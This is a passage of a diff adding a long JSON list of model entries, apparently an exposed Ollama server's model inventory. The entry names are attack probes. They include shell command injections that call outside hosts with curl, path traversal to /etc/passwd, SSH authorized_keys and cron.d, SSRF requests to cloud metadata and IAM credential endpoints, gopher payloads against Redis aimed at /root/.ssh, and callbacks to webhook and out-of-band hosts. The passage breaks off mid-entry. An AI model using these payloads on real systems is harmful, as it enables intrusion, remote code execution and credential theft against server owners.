+        "name": "read_hostname_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_rce2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rce_probe",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssrf_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:22/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:80/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:443/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:3000/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:5000/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:8000/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:8080/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:8443/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:9000/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:9200/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rce_exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../tmp/pwned",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test; curl http://172.233.44.98:11434/ | head -5",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../root/.ssh/authorized_keys2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:6379/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:9200/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../etc/passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "localhost:6379/ollama/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:3306/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:9200/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "127.0.0.1:5000/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "gopher://localhost:6379/_set%20test%20sshkey",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://192.168.50.10:8888/payload",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "environ_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rce_test_read",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "es_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "es_indices",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "svc_5000",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leer_passwd_173",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "escribir_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_f1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_f2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leer_shadow",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://169.254.169.254/latest/meta-data",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://169.254.169.253/latest/meta-data",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://100.100.100.200/latest/meta-data",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "metadata_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "$(cat /etc/passwd | head -5 2>&1)",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "$(id > /tmp/pwned_173 2>&1)",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leer_tmp_pwned",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_write_check",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "mykey",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "check_auth_keys",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssh_deploy",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leer_hostname",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:22/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:80/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:443/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:3000/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:5000/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:6379/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:8000/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:8080/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:8443/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:9000/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:9200/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:27017/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "file:///etc/passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "file:///root/.ssh/id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "/etc/passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "gopher://127.0.0.1:6379/_ping",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "crlf_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:80/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssrf_advanced",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:3000/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:5000/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "linode_meta",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:8000/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:8443/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:9090/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://169.254.169.254/latest/meta-data/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://metadata.google.internal/computemetadata/v1/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://100.100.100.200/latest/meta-data/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://ifconfig.me",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:11434/api/tags",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:99999/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "pwn",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_tmp",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../tmp/ollama_pwn_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leer_pwn_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leer_creds_real",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "https://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd?event=ssrf_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "cve_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../etc/cron.d/ollama_pwn",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://httpbin.org/get",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://postman-echo.com/get",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssrf_test_wh",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssrf_test_hb",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssrf_test_https",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test; curl -s http://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd?cmd=test; echo done",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test; curl http://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd?from=pull; echo",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rce_test_system",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leer_bash_hist",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "check_authkeys2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "auth_brute",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "from_auth",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "check_passwd2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "docker.io/library/ubuntu:latest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rce_test_final",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssh_key_model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "etc_passwd_check2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "138.199.52.195/vsociety/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "138.199.52.195/vsociety/test2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "138.199.52.195:8888/vsociety/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "conn_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:9999/minio/admin/v3/list",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "minio_config",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "minio_env",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "minio_service",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "138.199.52.195:8888/pwn_f2d639c6/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:9999/minio/admin/v3/list/buckets",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:9999/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:9999/minio/health/live",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "minio_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "138.199.52.195:80/conn_test/test_1782968744",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_minio_svc",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_minio_default",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_minio_config",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_minio_creds",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "138.199.52.195:8888/conn_test/test_1782968825",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_ollama_env",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "gratified-armed-sizzle.ngrok-free.dev/exploit_test/test1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_ollama_creds",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_small_file",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "gratified-armed-sizzle.ngrok-free.dev/https_test/model1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "pwn_test_read",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "pwn_read2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:3306/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "pwn_traverse",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:5432/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "pwn_modelfile",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "gopher://127.0.0.1:6379/_config%20set%20dir%20/root/.ssh",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_ollama_log",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read_syslog",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssrf_scan",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "fileread_test2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_`id > /tmp/pwned_ck`",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_$(curl http://138.199.52.195:8888/pwned)",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test:latest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "p",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "k",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "s",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssh",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "e",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://metadata.google.internal/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:22",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://d93ruj7aute9sbdkpr605jebapanswhqa.oast.fun/rogue/3fznmbgxyd9pplrtlcxzt9lq9i4",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "envreader",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read__etc_passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read__root_.aws_credentials",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read__opt_ollama_data_.env",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "llama3:8b",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://169.254.169.254/metadata/instance",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
